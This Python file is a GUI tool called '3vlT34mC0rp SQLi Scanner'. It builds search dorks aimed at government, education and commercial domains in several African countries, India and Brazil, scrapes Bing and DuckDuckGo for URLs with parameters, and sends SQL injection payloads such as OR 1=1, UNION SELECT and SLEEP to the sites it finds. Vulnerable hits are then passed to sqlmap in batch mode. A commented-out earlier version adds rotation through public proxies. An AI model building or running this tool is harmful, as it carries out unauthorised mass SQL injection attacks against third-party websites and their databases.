import requests
import random
import time
import threading
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from bs4 import BeautifulSoup
from fpdf import FPDF
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Optional, Set, Tuple
import datetime
import re
import urllib.parse
import subprocess


# Constants
RESULTS_FILE = "sqli_results.txt"
HTML_REPORT = "sqli_report.html"
MAX_WORKERS = 10
REQUEST_DELAY = (1.0, 3.0)  # Random delay range between requests
VERBOSE = True  # Global verbose flag
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

class VerboseLogger:
    """Enhanced logging system with verbose output control"""
    def __init__(self, text_widget: tk.Text):
        self.text_widget = text_widget
        self.log_levels = {
            "DEBUG": "#AAAAAA",
            "INFO": "#FFFFFF",
            "SUCCESS": "#00FF00",
            "WARNING": "#FFFF00",
            "ERROR": "#FF0000",
            "CRITICAL": "#FF00FF"
        }
    
    def log(self, message: str, level: str = "INFO", component: str = "SYSTEM"):
        """Log a message with timestamp and coloring"""
        if not VERBOSE and level == "DEBUG":
            return
            
        timestamp = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
        color = self.log_levels.get(level, "#FFFFFF")
        
        log_entry = f"[{timestamp}] [{component}] [{level}] {message}\n"
        self.text_widget.insert("end", log_entry, level)
        self.text_widget.tag_config(level, foreground=color)
        self.text_widget.see("end")
        self.text_widget.update()

class SQLiScannerGUI:
    """Main GUI application with verbose SQLi scanning"""
    def __init__(self, root):
        self.root = root
        self.root.title("3vlT34mC0rp SQLi Scanner")
        self.root.geometry("1200x850")
        self.root.iconbitmap("3vl.ico")
        self.root.resizable(False, False)
        
        # Initialize verbose logger
        self.logger = VerboseLogger(self.setup_ui())
        self.logger.log("Application initialized", "INFO", "SYSTEM")
        
        # Core components
        self.scanning = False
        self.current_scan_thread = None
        self.dorks = []
        
    def setup_ui(self) -> tk.Text:
        """Initialize the user interface with clear organization of buttons"""
        # Main paned window for resizable panels
        main_pane = ttk.PanedWindow(self.root, orient=tk.VERTICAL)
        main_pane.pack(fill=tk.BOTH, expand=True)
        
        # Log frame
        log_frame = ttk.Frame(main_pane)
        main_pane.add(log_frame, weight=1)
        
        # Text widget for logging
        log_text = tk.Text(
            log_frame,
            wrap=tk.WORD,
            bg="#121212",
            fg="#FFFFFF",
            insertbackground="white",
            font=("Consolas", 10),
            padx=10,
            pady=10
        )
        scrollbar = ttk.Scrollbar(log_frame, command=log_text.yview)
        log_text.configure(yscrollcommand=scrollbar.set)
        
        log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Control panel with two rows for buttons
        control_frame = ttk.Frame(main_pane)
        main_pane.add(control_frame, weight=0)
        
        # First row of buttons (Dork operations)
        buttons_row1 = [
            ("Generate Dorks", self.generate_dorks),
            ("Save Dorks", self.save_dorks),
            ("Load Dorks", self.load_dorks)
        ]
        
        # Second row of buttons (Scan operations + Clear UI)
        buttons_row2 = [
            ("Start Scan", self.start_scan),
            ("Stop Scan", self.stop_scan),
            ("Clear UI", self.clear_ui)
        ]
        
        # Place first row buttons
        for col, (text, cmd) in enumerate(buttons_row1):
            btn = ttk.Button(control_frame, text=text, command=cmd)
            btn.grid(row=0, column=col, padx=5, pady=5, sticky="ew")
        
        # Place second row buttons
        for col, (text, cmd) in enumerate(buttons_row2):
            btn = ttk.Button(control_frame, text=text, command=cmd)
            btn.grid(row=1, column=col, padx=5, pady=5, sticky="ew")
        
        # Configure column weights for even distribution
        for i in range(max(len(buttons_row1), len(buttons_row2))):
            control_frame.columnconfigure(i, weight=1)
        
        # Status bar
        self.status_var = tk.StringVar(value="Ready")
        status_bar = ttk.Label(
            self.root,
            textvariable=self.status_var,
            relief=tk.SUNKEN,
            anchor=tk.W
        )
        status_bar.pack(fill=tk.X)
        
        return log_text

    def clear_ui(self):
        """Clear the log window and reset status"""
        self.logger.text_widget.delete(1.0, tk.END)
        self.status_var.set("Ready")
        self.logger.log("UI cleared", "INFO", "SYSTEM")
    
    def generate_dorks(self):
        """Generate comprehensive search dorks with multiple categories"""
        self.logger.log("Generating advanced dorks...", "INFO", "DORKGEN")
        
        self.dorks = []
        generated = 0
        
        # 1. Common Vulnerable Parameters
        base_params = ["id", "page", "cat", "category", "product", "view", "user", 
                    "account", "file", "document", "item", "news", "article"]
        numeric_params = ["id", "pid", "uid", "num", "page", "item"]
        
        # 2. File Extensions
        extensions = {
            "Web Scripts": ["php", "asp", "aspx", "jsp", "cfm", "pl", "cgi"],
            "Admin Panels": ["admin", "login", "wp-admin", "administrator"],
            "Configuration": ["ini", "conf", "config", "bak", "old", "temp"]
        }
        
        # 3. Country Specific TLDs (Expanded)
        countries = {
            "Africa": {
                "Ghana": [".edu.gh", ".gov.gh", ".com.gh"],
                "Nigeria": [".edu.ng", ".gov.ng", ".com.ng"],
                "Kenya": [".edu.ke", ".go.ke", ".co.ke"],
                "South Africa": [".ac.za", ".gov.za", ".co.za"]
            },
            "Other Regions": {
                "India": [".edu.in", ".gov.in", ".ac.in"],
                "Brazil": [".edu.br", ".gov.br", ".com.br"]
            }
        }
        
        # 4. Platform-Specific Dorks
        platforms = {
            "WordPress": ["inurl:wp-content", "inurl:wp-includes", "inurl:wp-admin"],
            "Joomla": ["inurl:components/com_", "inurl:templates/"],
            "Drupal": ["inurl:sites/default/files", "inurl:?q=user/password"]
        }
        
        # 5. Advanced Patterns
        advanced_patterns = [
            # SQL injection specific
            "inurl:index.php?id=",
            "inurl:news.php?id=",
            "inurl:article.php?id=",
            # File inclusion
            "inurl:include.php?file=",
            "inurl:page.php?file=",
            # Authentication bypass
            "inurl:admin/login.php",
            "inurl:admin/index.php"
        ]
        
        # Generate Basic Dorks
        self.logger.log("Generating basic parameter dorks...", "DEBUG", "DORKGEN")
        for param in base_params:
            self.dorks.append(f"inurl:{param}=")
            generated += 1
        
        # Generate Numeric Parameter Dorks
        self.logger.log("Generating numeric parameter dorks...", "DEBUG", "DORKGEN")
        for param in numeric_params:
            self.dorks.append(f"inurl:{param}=1")
            self.dorks.append(f"inurl:{param}='")
            generated += 2
        
        # Generate Extension-Based Dorks
        self.logger.log("Generating file extension dorks...", "DEBUG", "DORKGEN")
        for ext_type, ext_list in extensions.items():
            for ext in ext_list:
                self.dorks.append(f"filetype:{ext}")
                self.dorks.append(f"ext:{ext}")
                generated += 2
        
        # Generate Country-Specific Dorks
        self.logger.log("Generating country-specific dorks...", "DEBUG", "DORKGEN")
        for region, country_data in countries.items():
            for country, tlds in country_data.items():
                for tld in tlds:
                    self.dorks.append(f"site:{tld} inurl:index.php?id=")
                    self.dorks.append(f"site:{tld} inurl:login.php")
                    generated += 2
        
        # Generate Platform-Specific Dorks
        self.logger.log("Generating CMS-specific dorks...", "DEBUG", "DORKGEN")
        for platform, patterns in platforms.items():
            self.dorks.extend(patterns)
            generated += len(patterns)
        
        # Add Advanced Patterns
        self.logger.log("Adding advanced patterns...", "DEBUG", "DORKGEN")
        self.dorks.extend(advanced_patterns)
        generated += len(advanced_patterns)
        
        # Remove duplicates while preserving order
        self.dorks = list(dict.fromkeys(self.dorks))
        generated = len(self.dorks)
        
        self.logger.log(f"Generated {generated} unique dorks", "SUCCESS", "DORKGEN")
        self.status_var.set(f"Dorks generated: {generated}")
        
        # Show sample in verbose mode
        if VERBOSE and self.dorks:
            categories = {
                "Parameter-based": [d for d in self.dorks if "inurl:" in d and "=" in d],
                "Filetype-based": [d for d in self.dorks if "filetype:" in d or "ext:" in d],
                "Country-specific": [d for d in self.dorks if "site:" in d],
                "Platform-specific": [d for d in self.dorks if any(p in d for p in ["wp-", "com_", "?q="])]
            }
            
            for cat_name, cat_dorks in categories.items():
                if cat_dorks:
                    sample = "\n".join(f"  - {d}" for d in cat_dorks[:3])
                    self.logger.log(f"{cat_name} samples:\n{sample}", "DEBUG", "DORKGEN")
                    if len(cat_dorks) > 3:
                        self.logger.log(f"... plus {len(cat_dorks)-3} more {cat_name.lower()} dorks", 
                                    "DEBUG", "DORKGEN")
    
    def save_dorks(self):
        """Save generated dorks to a file"""
        if not self.dorks:
            self.logger.log("No dorks to save", "WARNING", "DORKSAVE")
            messagebox.showwarning("Warning", "No dorks generated to save")
            return

        file_path = filedialog.asksaveasfilename(
            title="Save Dorks To File",
            defaultextension=".txt",
            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
        )

        if file_path:
            try:
                with open(file_path, "w") as f:
                    f.write("\n".join(self.dorks))
                self.logger.log(f"Saved {len(self.dorks)} dorks to {file_path}", "SUCCESS", "DORKSAVE")
                messagebox.showinfo("Success", f"Saved {len(self.dorks)} dorks to {file_path}")
            except Exception as e:
                self.logger.log(f"Error saving dorks: {str(e)}", "ERROR", "DORKSAVE")
                messagebox.showerror("Error", f"Failed to save dorks: {str(e)}")
        
    def load_dorks(self):
        """Load dorks from file with proper encoding handling"""
        file_path = filedialog.askopenfilename(
            title="Select Dorks File",
            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
        )
        
        if file_path:
            try:
                # Try UTF-8 first, fall back to other encodings if needed
                encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252']
                
                for encoding in encodings:
                    try:
                        with open(file_path, 'r', encoding=encoding) as f:
                            self.dorks = [line.strip() for line in f if line.strip()]
                        break
                    except UnicodeDecodeError:
                        continue
                
                self.logger.log(f"Loaded {len(self.dorks)} dorks from {file_path}", "SUCCESS", "DORKLOAD")
                self.status_var.set(f"Loaded {len(self.dorks)} dorks")
                
                if VERBOSE:
                    for i, dork in enumerate(self.dorks[:10]):  # Show first 10 in verbose mode
                        self.logger.log(f"Dork {i+1}: {dork}", "DEBUG", "DORKLOAD")
                    if len(self.dorks) > 10:
                        self.logger.log(f"... and {len(self.dorks)-10} more", "DEBUG", "DORKLOAD")
                        
            except Exception as e:
                self.logger.log(f"Error loading dorks: {str(e)}", "ERROR", "DORKLOAD")
                messagebox.showerror("Error", f"Failed to load dorks: {str(e)}")
    
    def start_scan(self):
        """Start the scanning process"""
        if not self.dorks:
            self.logger.log("No dorks loaded - cannot start scan", "ERROR", "SCAN")
            messagebox.showwarning("Warning", "No dorks loaded. Generate or load dorks first.")
            return
            
        if self.scanning:
            self.logger.log("Scan already running", "WARNING", "SCAN")
            messagebox.showinfo("Info", "Scan is already running")
            return
            
        self.scanning = True
        self.logger.log("Starting scan...", "INFO", "SCAN")
        self.logger.log(f"Loaded {len(self.dorks)} dorks to process", "INFO", "SCAN")
        
        # Clear previous results
        open(RESULTS_FILE, "w").close()
        self.logger.log("Cleared previous results file", "DEBUG", "SCAN")
        
        # Start scan thread
        self.current_scan_thread = threading.Thread(target=self.run_scan, daemon=True)
        self.current_scan_thread.start()
        
        self.status_var.set("Scanning in progress...")
    
    def stop_scan(self):
        """Stop the scan with confirmation logging"""
        if self.scanning:
            self.scanning = False
            self.logger.log("Scan stop requested...", "WARNING", "SCAN")
            self.status_var.set("Stopping scan...")
        else:
            self.logger.log("No active scan to stop", "INFO", "SCAN")
            messagebox.showinfo("Info", "No scan is currently running")
    
    def run_scan(self):
        """Main scanning loop that saves targets and prompts for SQLMap"""
        try:
            total_vulnerable = 0
            total_tested = 0
            vulnerable_urls = []  # Store vulnerable URLs
            
            for i, dork in enumerate(self.dorks):
                if not self.scanning:
                    break
                    
                self.logger.log(f"\nProcessing dork {i+1}/{len(self.dorks)}: {dork}", "INFO", "SCAN")
                self.status_var.set(f"Processing dork {i+1}/{len(self.dorks)}...")
                
                # Search for URLs
                start_time = time.time()
                urls = self.hybrid_search(dork)
                search_time = time.time() - start_time
                
                if urls:
                    self.logger.log(f"Found {len(urls)} potential targets in {search_time:.2f}s", "SUCCESS", "SCAN")
                    
                    # Test the URLs
                    start_test = time.time()
                    vulnerable = self.test_urls(urls)
                    test_time = time.time() - start_test
                    
                    total_vulnerable += vulnerable
                    total_tested += len(urls)
                    
                    self.logger.log(
                        f"Tested {len(urls)} URLs in {test_time:.2f}s - Found {vulnerable} vulnerable",
                        "INFO", "SCAN"
                    )
                else:
                    self.logger.log("No targets found for this dork", "WARNING", "SCAN")
                
                # Delay between dorks
                delay = random.uniform(*REQUEST_DELAY)
                self.logger.log(f"Waiting {delay:.2f}s before next dork...", "DEBUG", "SCAN")
                time.sleep(delay)
            
            # Save all vulnerable URLs to file
            self.save_vulnerable_targets()
            
            # Scan completion summary
            self.logger.log(
                f"\nScan completed. Tested {total_tested} URLs total. Found {total_vulnerable} vulnerable.",
                "SUCCESS" if total_vulnerable > 0 else "INFO",
                "SCAN"
            )
            self.status_var.set(
                f"Scan complete - {total_vulnerable} vulnerabilities found" if total_vulnerable > 0 
                else "Scan complete - no vulnerabilities found"
            )
            
            # Prompt to run SQLMap if vulnerabilities found
            if total_vulnerable > 0:
                self.prompt_for_sqlmap()
            
        except Exception as e:
            self.logger.log(f"Scan error: {str(e)}", "ERROR", "SCAN")
            messagebox.showerror("Error", f"Scan failed: {str(e)}")
        finally:
            self.scanning = False
            if self.current_scan_thread.is_alive():
                self.current_scan_thread.join()

    def save_vulnerable_targets(self):
        """Save all vulnerable URLs to a file"""
        try:
            with open(RESULTS_FILE, "r") as f:
                vulnerable_urls = [line.split('\t')[0] for line in f if line.strip()]
            
            if vulnerable_urls:
                with open("vulnerable_targets.txt", "w") as f:
                    f.write("\n".join(vulnerable_urls))
                self.logger.log(f"Saved {len(vulnerable_urls)} vulnerable targets to vulnerable_targets.txt", "SUCCESS", "SCAN")
        except Exception as e:
            self.logger.log(f"Error saving vulnerable targets: {str(e)}", "ERROR", "SCAN")

    def prompt_for_sqlmap(self):
        """Ask user if they want to run SQLMap on found vulnerabilities"""
        response = messagebox.askyesno(
            "SQLMap Integration",
            "Vulnerable targets found. Would you like to run SQLMap on these targets?",
            parent=self.root
        )
        
        if response:
            self.run_sqlmap()

    def run_sqlmap(self):
        """Execute SQLMap on the found vulnerable targets"""
        try:
            if not os.path.exists("vulnerable_targets.txt"):
                messagebox.showerror("Error", "No vulnerable targets file found")
                return
                
            # Basic SQLMap command (customize as needed)
            sqlmap_cmd = [
                "sqlmap",
                "-m", "vulnerable_targets.txt",
                "--batch",  # Non-interactive mode
                "--level=3",  # Test level
                "--risk=2"   # Risk level
            ]
            
            self.logger.log("Starting SQLMap with command:", "INFO", "SQLMAP")
            self.logger.log(" ".join(sqlmap_cmd), "DEBUG", "SQLMAP")
            
            # Run SQLMap in a separate thread to avoid freezing the GUI
            threading.Thread(
                target=self.execute_sqlmap,
                args=(sqlmap_cmd,),
                daemon=True
            ).start()
            
        except Exception as e:
            self.logger.log(f"Error starting SQLMap: {str(e)}", "ERROR", "SQLMAP")
            messagebox.showerror("Error", f"Failed to start SQLMap: {str(e)}")

    def execute_sqlmap(self, cmd):
        """Execute SQLMap command and capture output"""
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Stream output to log
            for line in process.stdout:
                self.logger.log(line.strip(), "INFO", "SQLMAP")
                
            process.wait()
            
            if process.returncode == 0:
                self.logger.log("SQLMap completed successfully", "SUCCESS", "SQLMAP")
            else:
                self.logger.log(f"SQLMap failed with return code {process.returncode}", "ERROR", "SQLMAP")
                
        except Exception as e:
            self.logger.log(f"Error during SQLMap execution: {str(e)}", "ERROR", "SQLMAP")
    
    def hybrid_search(self, dork: str) -> List[str]:
        """Search using multiple engines with verbose output"""
        self.logger.log(f"Initiating hybrid search for: {dork}", "DEBUG", "SEARCH")
        
        urls = set()
        engines = [
            ("Bing", self.search_bing),
            ("DuckDuckGo", self.search_duckduckgo)
        ]
        
        for engine_name, engine_func in engines:
            if not self.scanning:
                break
                
            self.logger.log(f"Searching with {engine_name}...", "INFO", "SEARCH")
            try:
                start_time = time.time()
                results = engine_func(dork)
                search_time = time.time() - start_time
                
                new_urls = len(results) - len(urls.intersection(results))
                urls.update(results)
                
                self.logger.log(
                    f"{engine_name} found {len(results)} URLs ({new_urls} new) in {search_time:.2f}s",
                    "INFO", "SEARCH"
                )
                
                if VERBOSE and results:
                    for url in results[:3]:
                        self.logger.log(f"Found URL: {url}", "DEBUG", "SEARCH")
                    if len(results) > 3:
                        self.logger.log(f"... and {len(results)-3} more", "DEBUG", "SEARCH")
                
            except Exception as e:
                self.logger.log(f"{engine_name} search failed: {str(e)}", "ERROR", "SEARCH")
        
        return list(urls)
    
    def search_bing(self, dork: str, pages: int = 2) -> List[str]:
        """Search Bing without proxies"""
        urls = set()
        base_url = "https://www.bing.com/search"
        
        for page in range(pages):
            if not self.scanning:
                break
                
            query = {
                "q": dork,
                "first": page * 10
            }
            search_url = f"{base_url}?{urllib.parse.urlencode(query)}"
            
            self.logger.log(f"Fetching Bing page {page+1}: {search_url}", "DEBUG", "BING")
            
            try:
                response = requests.get(
                    search_url,
                    headers=HEADERS,
                    timeout=10
                )
                
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, "html.parser")
                    found = 0
                    
                    for link in soup.find_all("a", href=True):
                        url = link["href"]
                        if self.is_potential_target(url):
                            clean_url = self.clean_url(url)
                            if clean_url not in urls:
                                urls.add(clean_url)
                                found += 1
                                if VERBOSE:
                                    self.logger.log(f"New target found: {clean_url}", "DEBUG", "BING")
                    
                    self.logger.log(f"Page {page+1}: Found {found} new targets", "INFO", "BING")
                else:
                    self.logger.log(f"Bing returned status {response.status_code}", "WARNING", "BING")
                
                # Delay between pages
                delay = random.uniform(*REQUEST_DELAY)
                time.sleep(delay)
                
            except Exception as e:
                self.logger.log(f"Bing search error: {str(e)}", "ERROR", "BING")
                continue
        
        return list(urls)
    
    def search_duckduckgo(self, dork: str, pages: int = 2) -> List[str]:
        """Search DuckDuckGo without proxies"""
        urls = set()
        base_url = "https://html.duckduckgo.com/html/"
        
        for page in range(pages):
            if not self.scanning:
                break
                
            query = {
                "q": dork,
                "s": page * 30,
                "dc": str(page + 1)
            }
            
            self.logger.log(f"Fetching DuckDuckGo page {page+1}", "DEBUG", "DDG")
            
            try:
                response = requests.post(
                    base_url,
                    data=query,
                    headers=HEADERS,
                    timeout=10
                )
                
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, "html.parser")
                    found = 0
                    
                    for link in soup.find_all("a", class_="result__url"):
                        url = link["href"]
                        if url.startswith("//"):
                            url = "https:" + url
                        if self.is_potential_target(url):
                            clean_url = self.clean_url(url)
                            if clean_url not in urls:
                                urls.add(clean_url)
                                found += 1
                                if VERBOSE:
                                    self.logger.log(f"New target found: {clean_url}", "DEBUG", "DDG")
                    
                    self.logger.log(f"Page {page+1}: Found {found} new targets", "INFO", "DDG")
                else:
                    self.logger.log(f"DuckDuckGo returned status {response.status_code}", "WARNING", "DDG")
                
                # Delay between pages
                delay = random.uniform(*REQUEST_DELAY)
                time.sleep(delay)
                
            except Exception as e:
                self.logger.log(f"DuckDuckGo search error: {str(e)}", "ERROR", "DDG")
                continue
        
        return list(urls)
    
    def test_urls(self, urls: List[str]) -> int:
        """Test URLs for SQLi with detailed progress reporting"""
        vulnerable_count = 0
        total_urls = len(urls)
        
        self.logger.log(f"Beginning SQLi tests for {total_urls} URLs", "INFO", "TESTER")
        
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = {}
            
            for i, url in enumerate(urls):
                if not self.scanning:
                    break
                    
                futures[executor.submit(self.test_sql_injection, url)] = url
                
                # Progress update every 10 URLs
                if VERBOSE and i % 10 == 0 and i > 0:
                    self.logger.log(f"Submitted {i}/{total_urls} URLs for testing", "DEBUG", "TESTER")
            
            # Process completed tests
            for i, future in enumerate(as_completed(futures)):
                if not self.scanning:
                    executor.shutdown(wait=False)
                    break
                    
                url = futures[future]
                
                try:
                    result = future.result()
                    if result:
                        vulnerable_count += 1
                        self.logger.log(f"Vulnerability confirmed: {url}", "SUCCESS", "TESTER")
                    else:
                        if VERBOSE:
                            self.logger.log(f"Test completed: {url} - Not vulnerable", "DEBUG", "TESTER")
                except Exception as e:
                    self.logger.log(f"Test failed for {url}: {str(e)}", "ERROR", "TESTER")
                
                # Progress update
                if (i + 1) % 10 == 0 or (i + 1) == len(urls):
                    self.logger.log(
                        f"Progress: {i+1}/{total_urls} tested - {vulnerable_count} vulnerable",
                        "INFO", "TESTER"
                    )
                    self.status_var.set(
                        f"Testing: {i+1}/{total_urls} - {vulnerable_count} vulns found"
                    )
        
        return vulnerable_count

    def test_sql_injection(self, url: str) -> bool:
        """Test a single URL for SQLi with detailed payload testing"""
        if not self.scanning:
            return False
            
        self.logger.log(f"Testing URL: {url}", "DEBUG", "TESTER")
        
        # Standard SQLi payloads
        payloads = [
            ("Single quote", "'"),
            ("Double quote", "\""),
            ("OR 1=1", "' OR '1'='1"),
            ("OR 1=1 comment", "' OR 1=1--"),
            ("OR 1=1 hash", "' OR 1=1#"),
            ("Boolean blind", "' AND 1=CONVERT(int,@@version)--"),
            ("Time delay", "' OR IF(1=1,SLEEP(5),0)--"),
            ("Union test", "' UNION SELECT 1,2,3--")
        ]
        
        for name, payload in payloads:
            if not self.scanning:
                return False
                
            test_url = self.inject_payload(url, payload)
            self.logger.log(f"Trying payload '{name}': {test_url}", "DEBUG", "TESTER")
            
            try:
                start_time = time.time()
                response = requests.get(
                    test_url,
                    headers=HEADERS,
                    timeout=10
                )
                response_time = time.time() - start_time
                
                # Check for SQL errors
                if self.detect_sql_errors(response.text):
                    self.logger.log(
                        f"Potential SQLi found with payload '{name}' - Response time: {response_time:.2f}s",
                        "SUCCESS", "TESTER"
                    )
                    
                    # Save the vulnerable URL with payload info
                    with open(RESULTS_FILE, "a") as f:
                        f.write(f"{url}\tPayload: {name} ({payload})\n")
                    
                    return True
                
                # Check for time-based blind SQLi
                if "Time delay" in name and response_time > 4:
                    self.logger.log(
                        f"Potential time-based blind SQLi (delay {response_time:.2f}s)",
                        "SUCCESS", "TESTER"
                    )
                    with open(RESULTS_FILE, "a") as f:
                        f.write(f"{url}\tBlind SQLi (time delay) with payload: {payload}\n")
                    return True
                
                # Small delay between payloads
                time.sleep(0.5)
                
            except Exception as e:
                self.logger.log(f"Payload test failed: {str(e)}", "ERROR", "TESTER")
                continue
        
        return False

    def inject_payload(self, url: str, payload: str) -> str:
        """Inject a payload into the URL parameters"""
        if "?" in url:
            base, params = url.split("?", 1)
            param_pairs = params.split("&")
            injected_params = []
            
            for pair in param_pairs:
                if "=" in pair:
                    key, value = pair.split("=", 1)
                    injected_params.append(f"{key}={value}{payload}")
                else:
                    injected_params.append(pair)
            
            return f"{base}?{'&'.join(injected_params)}"
        else:
            return f"{url}?{payload}"
    
    def detect_sql_errors(self, response_text: str) -> bool:
        """Check response text for SQL error patterns"""
        error_patterns = [
            "sql syntax",
            "mysql_fetch",
            "ORA-",
            "syntax error",
            "unclosed quotation mark",
            "quoted string not properly terminated",
            "odbc microsoft access driver",
            "sqlserver",
            "mysql error",
            "postgresql error",
            "syntax error near",
            "unexpected end of sql command",
            "sql command not properly ended",
            "warning: mysql",
            "sqlite exception",
            "pdoexception"
        ]
        
        text_lower = response_text.lower()
        return any(error in text_lower for error in error_patterns)
    
    def is_potential_target(self, url: str) -> bool:
        """Check if URL looks like a potential SQLi target"""
        if not url.startswith(('http://', 'https://')):
            return False
            
        # Skip common static file extensions
        static_extensions = ['.pdf', '.jpg', '.png', '.css', '.js', '.svg']
        if any(url.lower().endswith(ext) for ext in static_extensions):
            return False
            
        # Look for common vulnerable patterns
        vulnerable_patterns = ['?id=', '?page=', '?user=', '?cat=', '?product=']
        return any(pattern in url.lower() for pattern in vulnerable_patterns)

    def clean_url(self, url: str) -> str:
        """Clean and normalize URL"""
        # Remove fragments and common tracking parameters
        url = url.split('#')[0]
        for param in ['utm_', 'fbclid', 'gclid', 'sessionid']:
            url = re.sub(f'[&?]{param}=[^&]*', '', url)
        return url
    
    # def export_html(self):
    #     """Export results to HTML report"""
    #     try:
    #         with open(RESULTS_FILE, "r") as f:
    #             results = [line.strip().split("\t") for line in f if line.strip()]
            
    #         if not results:
    #             messagebox.showinfo("Info", "No results to export")
    #             return
                
    #         html = """<!DOCTYPE html>
    #     <html lang="en">
    #     <head>
    #         <meta charset="UTF-8">
    #         <title>SQL Injection Scan Report</title>
    #         <style>
    #             body { font-family: Arial, sans-serif; margin: 20px; }
    #             h1 { color: #333; }
    #             table { border-collapse: collapse; width: 100%; }
    #             th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
    #             th { background-color: #f2f2f2; }
    #             tr:nth-child(even) { background-color: #f9f9f9; }
    #             .vulnerable { color: red; font-weight: bold; }
    #         </style>
    #     </head>
    #     <body>
    #         <h1>SQL Injection Scan Report</h1>
    #         <p>Generated on {datetime}</p>
    #         <table>
    #             <tr>
    #                 <th>URL</th>
    #                 <th>Payload</th>
    #                 <th>Status</th>
    #             </tr>
    #     """.format(datetime=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
                    
    #                 for result in results:
    #                     url = result[0]
    #                     payload = result[1] if len(result) > 1 else "N/A"
    #                     html += f"""
    #             <tr>
    #                 <td><a href="{url}" target="_blank">{url}</a></td>
    #                 <td>{payload}</td>
    #                 <td class="vulnerable">Vulnerable</td>
    #             </tr>
    #     """
                    
    #                 html += """
    #         </table>
    #     </body>
    #     </html>
    #     """
    #         with open(HTML_REPORT, "w") as f:
    #             f.write(html)
            
    #         self.logger.log(f"HTML report saved to {HTML_REPORT}", "SUCCESS", "EXPORT")
    #         messagebox.showinfo("Success", f"HTML report saved to {HTML_REPORT}")
            
    #     except Exception as e:
    #         self.logger.log(f"Error exporting HTML: {str(e)}", "ERROR", "EXPORT")
    #         messagebox.showerror("Error", f"Failed to export HTML: {str(e)}")
    
    # def export_pdf(self):
    #     """Export results to PDF report"""
    #     try:
    #         pdf = FPDF()
    #         pdf.add_page()
    #         pdf.set_font("Arial", size=12)
            
    #         # Title
    #         pdf.cell(200, 10, txt="SQL Injection Scan Report", ln=True, align="C")
    #         pdf.ln(10)
            
    #         # Date
    #         pdf.set_font("", size=10)
    #         pdf.cell(200, 10, txt=f"Generated on: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", ln=True)
    #         pdf.ln(10)
            
    #         # Results
    #         pdf.set_font("", "B", size=12)
    #         pdf.cell(200, 10, txt="Vulnerable URLs:", ln=True)
    #         pdf.set_font("", size=10)
            
    #         try:
    #             with open(RESULTS_FILE, "r") as f:
    #                 for line in f:
    #                     if line.strip():
    #                         parts = line.strip().split("\t")
    #                         url = parts[0]
    #                         payload = parts[1] if len(parts) > 1 else ""
    #                         pdf.multi_cell(0, 10, txt=f"URL: {url}\nPayload: {payload}\n", border=0)
    #                         pdf.ln(2)
    #         except FileNotFoundError:
    #             pdf.multi_cell(0, 10, txt="No results found", border=0)
            
    #         # Save dialog
    #         file_path = filedialog.asksaveasfilename(
    #             defaultextension=".pdf",
    #             filetypes=[("PDF Files", "*.pdf")],
    #             title="Save PDF Report"
    #         )
            
    #         if file_path:
    #             pdf.output(file_path)
    #             self.logger.log(f"PDF report saved to {file_path}", "SUCCESS", "EXPORT")
    #             messagebox.showinfo("Success", f"PDF report saved to {file_path}")
                
    #     except Exception as e:
    #         self.logger.log(f"Error exporting PDF: {str(e)}", "ERROR", "EXPORT")
    #         messagebox.showerror("Error", f"Failed to export PDF: {str(e)}")

if __name__ == "__main__":
    root = tk.Tk()
    app = SQLiScannerGUI(root)
    root.mainloop()





# import requests
# import random
# import time
# import threading
# import tkinter as tk
# from tkinter import ttk, filedialog, messagebox
# from bs4 import BeautifulSoup
# from fpdf import FPDF
# from concurrent.futures import ThreadPoolExecutor, as_completed
# from typing import List, Dict, Optional, Set, Tuple
# import datetime
# import json
# from pathlib import Path
# import urllib.parse
# import re
# from typing import List

# # Constants
# CONFIG_FILE = "scanner_config.json"
# HEADERS = {
#     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
# }
# PROXY_SOURCES = [
#     "https://www.proxy-list.download/api/v1/get?type=http",
#     "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http"
# ]
# RESULTS_FILE = "sqli_results.txt"
# HTML_REPORT = "sqli_report.html"
# MAX_WORKERS = 10
# REQUEST_DELAY = (1.0, 3.0)  # Random delay range between requests
# VERBOSE = True  # Global verbose flag

# class VerboseLogger:
#     """Enhanced logging system with verbose output control"""
#     def __init__(self, text_widget: tk.Text):
#         self.text_widget = text_widget
#         self.log_levels = {
#             "DEBUG": "#AAAAAA",
#             "INFO": "#FFFFFF",
#             "SUCCESS": "#00FF00",
#             "WARNING": "#FFFF00",
#             "ERROR": "#FF0000",
#             "CRITICAL": "#FF00FF"
#         }
    
#     def log(self, message: str, level: str = "INFO", component: str = "SYSTEM"):
#         """Log a message with timestamp and coloring"""
#         if not VERBOSE and level == "DEBUG":
#             return
            
#         timestamp = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
#         color = self.log_levels.get(level, "#FFFFFF")
        
#         log_entry = f"[{timestamp}] [{component}] [{level}] {message}\n"
#         self.text_widget.insert("end", log_entry, level)
#         self.text_widget.tag_config(level, foreground=color)
#         self.text_widget.see("end")
#         self.text_widget.update()

# class ProxyManager:
#     """Handles proxy acquisition and rotation with verbose logging"""
#     def __init__(self, logger: VerboseLogger):
#         self.logger = logger
#         self.proxies: List[str] = []
#         self.working_proxies: Set[str] = set()
#         self.last_refresh: Optional[float] = None
#         self.load_config()
#         self.test_url = "https://httpbin.org/ip"
#         self.logger.log("ProxyManager initialized", "DEBUG", "PROXY")

#     def load_config(self):
